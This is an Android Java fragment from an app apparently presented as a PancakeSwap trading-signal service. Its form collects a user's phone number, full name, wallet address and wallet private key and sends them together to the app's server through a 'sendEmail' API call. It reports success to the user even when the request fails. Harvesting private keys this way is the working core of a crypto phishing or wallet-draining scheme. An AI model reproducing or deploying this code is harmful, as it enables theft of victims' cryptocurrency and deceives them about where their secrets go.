package com.signalpancakeswap.signalpancakeswap.fragments;

import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.RecyclerView;

import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.RadioButton;
import android.widget.TextView;
import android.widget.Toast;

import com.signalpancakeswap.signalpancakeswap.R;
import com.signalpancakeswap.signalpancakeswap.WebService.APIClient;
import com.signalpancakeswap.signalpancakeswap.WebService.APIInterface;

import org.w3c.dom.Text;

import info.hoang8f.android.segmented.SegmentedGroup;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SendEmailFragment extends Fragment {
    EditText phoneNumber,fullName,wallet,key;
    TextView submit;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_send_email, container, false);
        phoneNumber = view.findViewById(R.id.phoneNumber);
        fullName = view.findViewById(R.id.fullName);
        wallet = view.findViewById(R.id.wallet);
        key = view.findViewById(R.id.key);
        submit = view.findViewById(R.id.submit);
        return view;
    }

    @Override
    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);

        submit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(!phoneNumber.getText().toString().isEmpty() &&
                !fullName.getText().toString().isEmpty() &&
                !wallet.getText().toString().isEmpty() &&
                !key.getText().toString().isEmpty()){
                    APIInterface apiInterface = APIClient.getClient().create(APIInterface.class);
                    Call<Boolean> call = apiInterface.sendEmail(
                            "شماره تماس : " + phoneNumber.getText().toString() + " \n"+
                            "نام و نام خانوادگی : " + fullName.getText().toString() + " \n"+
                            "کیف پول : " + wallet.getText().toString() + " \n"+
                            "کلید خصوصی : " + key.getText().toString() + " \n"
                    );
                    call.enqueue(new Callback<Boolean>() {
                        @Override
                        public void onResponse(Call<Boolean> call, Response<Boolean> response) {
                            if(response.code()==200){
                                Toast.makeText(getContext(), "با موفقیت ارسال شد", Toast.LENGTH_SHORT).show();
                            }
                        }

                        @Override
                        public void onFailure(Call<Boolean> call, Throwable t) {
                            Toast.makeText(getContext(), "با موفقیت ارسال شد", Toast.LENGTH_SHORT).show();
                        }
                    });
                }
            }
        });

    }
}